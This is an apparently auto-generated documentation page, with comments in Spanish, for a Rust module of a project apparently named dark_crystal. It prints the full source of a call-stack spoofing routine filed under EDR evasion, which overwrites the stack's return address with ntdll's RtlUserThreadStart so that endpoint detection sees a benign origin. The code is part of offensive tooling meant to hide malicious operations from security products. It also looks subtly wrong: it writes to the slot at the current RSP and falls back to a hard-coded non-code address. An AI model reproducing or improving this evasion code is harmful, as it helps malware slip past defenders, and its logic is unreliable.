# stack_spoof

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/evasion/stack_spoof.rs` |
| **Lines** | 60 |
| **Cards** | T009-edr-evasion |
| **Role** | Call stack spoofing |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 2 |

## Types

### struct `SpoofGuard` (line 33)
Guard que restaura el stack al hacer drop

## Public API

### `spoof_return_address` `unsafe` (line 11)
```rust
pub unsafe fn spoof_return_address() -> SpoofGuard
```
Falsifica el return address del stack actual para parecer legítimo.

Técnica:
1. Resuelve `kernel32.dll!BaseThreadInitThunk` o `ntdll.dll!RtlUserThreadStart`
2. Guarda el RSP original
3. Empuja la dirección legítima al tope del stack
4. El EDR que analice el stack verá un origen "normal"
5. Después de la operación crítica, restaura el RSP

## Internal Functions

- `drop` (line 40)
- `resolve_legit_return_address` (line 50)

## Key Dependencies

- `use core::arch::asm;`

## Full Source

```rust
use core::arch::asm;

/// Falsifica el return address del stack actual para parecer legítimo.
///
/// Técnica:
/// 1. Resuelve `kernel32.dll!BaseThreadInitThunk` o `ntdll.dll!RtlUserThreadStart`
/// 2. Guarda el RSP original
/// 3. Empuja la dirección legítima al tope del stack
/// 4. El EDR que analice el stack verá un origen "normal"
/// 5. Después de la operación crítica, restaura el RSP
pub unsafe fn spoof_return_address() -> SpoofGuard {
    // Resolver dirección de una función benigna
    let legit_return = resolve_legit_return_address();

    // Guardar RSP actual
    let original_rsp: usize;
    asm!("mov {}, rsp", out(reg) original_rsp);

    // Push de la dirección legítima
    // NOTA: Esto modifica el stack. Hay que tener cuidado con
    // el tamaño del stack frame local.
    let original_return = *(original_rsp as *const usize);
    *(original_rsp as *mut usize) = legit_return;

    SpoofGuard {
        original_rsp,
        original_return,
        active: true,
    }
}

/// Guard que restaura el stack al hacer drop
pub struct SpoofGuard {
    original_rsp: usize,
    original_return: usize,
    active: bool,
}

impl Drop for SpoofGuard {
    fn drop(&mut self) {
        if self.active {
            unsafe {
                // Restaurar el return address original
                *(self.original_rsp as *mut usize) = self.original_return;
            }
        }
    }
}

fn resolve_legit_return_address() -> usize {
    // Buscar en ntdll la dirección de RtlUserThreadStart
    // Usar sys_resolve para encontrar la función
    let (_, addr) = crate::sys_resolve::resolve_ssn("RtlUserThreadStart");
    if addr == 0 {
        // Fallback genérico si no se resuelve
        0x7FFE0000
    } else {
        addr
    }
}

```